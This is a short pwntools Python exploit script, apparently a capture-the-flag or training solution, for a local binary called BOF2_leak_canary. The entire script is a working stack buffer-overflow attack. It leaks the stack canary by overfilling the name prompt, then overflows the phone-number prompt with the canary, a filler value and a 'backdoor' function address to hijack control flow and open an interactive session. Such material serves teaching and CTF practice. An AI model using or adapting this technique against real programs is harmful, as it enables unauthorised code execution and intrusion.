from pwn import *

context.arch = 'amd64'
r = process('./BOF2_leak_canary')

no_push_rbp_backdoor_addr = 0x4006a7 # objdump -d -M intel ./BOF2_leak_canary | less

#gdb.attach(r)
r.sendafter("What's your name: ", b'A'*0x29)
# 0x10 for name + 0x10 for phone + 0x8 for alignment + 0x1 for the first byte of canary
r.recvuntil('A'*0x29)
canary = u64(b'\x00' + r.recv(7))
print("canary: ", hex(canary))
r.sendafter("What's your phone number: ", b'A'*0x18 + p64(canary) + p64(0xdeadbeef) + p64(no_push_rbp_backdoor_addr))
r.interactive()